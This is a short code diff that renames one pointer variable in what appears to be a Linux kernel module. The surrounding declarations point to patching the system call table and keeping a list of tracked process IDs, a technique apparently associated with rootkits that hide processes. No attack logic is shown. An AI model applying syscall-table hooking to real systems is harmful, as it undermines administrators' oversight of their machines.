@@ -77,7 +77,7 @@ struct pid_list_node *pid_list_find(pid_t nr);
  */
 void **my_sct;
 void **sys_call_table;
-unsigned int *psct_fastcall;
+unsigned int *psct_fastpath;
 unsigned int *psct_slowpath;
 struct pid_list_node *pid_list_head;
 struct pid_list_node *pid_list_tail;
